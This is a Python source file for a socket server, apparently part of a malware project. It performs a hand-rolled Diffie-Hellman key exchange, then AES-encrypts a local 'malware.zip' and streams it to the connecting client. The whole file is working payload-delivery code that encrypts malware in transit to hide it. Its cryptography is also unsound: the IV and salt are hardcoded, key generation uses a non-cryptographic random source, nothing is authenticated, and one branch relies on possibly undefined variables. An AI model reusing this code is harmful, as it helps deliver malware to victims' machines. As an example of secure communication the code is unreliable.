import os
import random
import socket

import tqdm as tqdm
from pyparsing import unicode
from sympy import *
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import pbkdf2
import hashlib

HOST = '127.0.0.1'  # Symbolic name, meaning all available interfaces
PORT = 65432  # Arbitrary non-privileged port
MAX_BUFFER_SIZE = 4096
DH_KEY_LENGTH = 1024
SALT = b'\x00\x03\x90\xfc\xbfm\xe4\x9e\x9a\xe2K\x04\x0cFaV'
AES_KEY_LENGTH = 256
BLOCKS_LENGTH = 16
IV = b'9\x97\x8fb\xa0\x82\xe1?\xadb\x89\x11,\xcc\xff\t'

MALWARE_PATH = "./malware.zip"
MIN_DATA_SIZE = 1024
FILE_SIZE = os.path.getsize(MALWARE_PATH)


def generate_key_pair():
    g = 5

    p = 1
    while not isprime(p):
        p = random.getrandbits(DH_KEY_LENGTH)

    a = random.getrandbits(DH_KEY_LENGTH)

    y = pow(g, a, mod=p)
    return p, g, a, y


def pad_data(data):
    return data + (BLOCKS_LENGTH - len(data) % BLOCKS_LENGTH) * \
                  bytes(chr(BLOCKS_LENGTH - len(data) % BLOCKS_LENGTH), encoding="utf-8")


def unpad_data(data):
    return data[:-ord(data[len(data) - 1:])]


def calculate_dh_key(base, secret, mod_prime):
    return pow(int(base), secret, mod=mod_prime)


def calculate_aes_key(dh_key):
    key = b""
    return pbkdf2.pbkdf2(hashlib.sha256, key.fromhex(dh_key), SALT, 480000, 32)


def fetch_malware():
    exe_path = MALWARE_PATH
    # exe_path = ".\\tanuki_the_server\\malware.zip"
    with open(exe_path, 'rb') as f:
        binary_data = f.read()
        return binary_data


def split_data_for_buffer(data, buffer_size):
    return [data[i:i + buffer_size] for i in range(0, len(data), buffer_size)]


def string_to_byte_array(hex_str):
    try:
        num_chars = len(hex_str)
        bytes = bytearray(num_chars // 2)
        for i in range(0, num_chars, 2):
            bytes[i // 2] = int(hex_str[i:i + 2], 16)
            print("Byte written:", bytes[i // 2])

        return bytes
    except Exception as ex:
        print("StringToByteArray error:", ex)
        return None


def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)

    print(f"Server listening on {HOST}:{PORT}")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Accepted connection from {client_address[0]}:{client_address[1]}")

        dh_secret = 0
        dh_prime = 0

        while True:
            message = client_socket.recv(MAX_BUFFER_SIZE)

            if not message:
                break

            request = json.loads(message.decode("utf-8"))
            operation = request["Operation"]

            if operation == "keyExchangeGen":
                print(f"Received request for encrypted communication")
                dh_prime, g, dh_secret, y = generate_key_pair()
                response = {"Operation": "keyExchange", "Prime": str(dh_prime), "Generator": str(g),
                            "Gx_server": str(y)}
                print("Sending params for key generation")
                client_socket.sendall(bytes(json.dumps(response), encoding="utf-8"))
            elif operation == "keyExchangeAns":
                print(f"Received params to establish symmetric encryption key")
                dh_key = calculate_dh_key(int(request["Gx_client"]), dh_secret, dh_prime)
                dh_key_hex = hex(dh_key)[2:]
                if len(dh_key_hex) % 2 != 0:
                    dh_key_hex = dh_key_hex + "0"
                print("dh key int: " + str(dh_key))
                print("dh key hex: " + dh_key_hex)

                aes_key = calculate_aes_key(dh_key_hex)
                print(f"Computed AES key: {aes_key.hex()}")

                cipher = Cipher(algorithms.AES(aes_key), modes.CBC(IV))
                encryptor = cipher.encryptor()

                original_text = pad_data(fetch_malware())
                
                #hash_original_text = hashlib.sha256(original_text).hexdigest()
                #response = {"Operation": "ExeSend", "Hash": hash_original_text}
                #print("Sending hash for check")
                #client_socket.sendall(bytes(json.dumps(response), encoding="utf-8"))
                
                cipher_text = encryptor.update(original_text) + encryptor.finalize()

                split_data = split_data_for_buffer(cipher_text, MAX_BUFFER_SIZE)
                
                progress = tqdm.tqdm(range(FILE_SIZE), f"Sending {MALWARE_PATH}", unit="B", unit_scale=True, unit_divisor=FILE_SIZE / 100)

                print("Sending encrypted executable")
                for data in split_data:
                    client_socket.sendall(data)
                    progress.update(len(data))

                #client_socket.close()
                break
            
            elif operation == "ExeSend":
                for data in split_data:
                    client_socket.sendall(data)
                    progress.update(len(data))
                                    

        print("End request")


if __name__ == "__main__":
    print(str(FILE_SIZE))
    start_server()
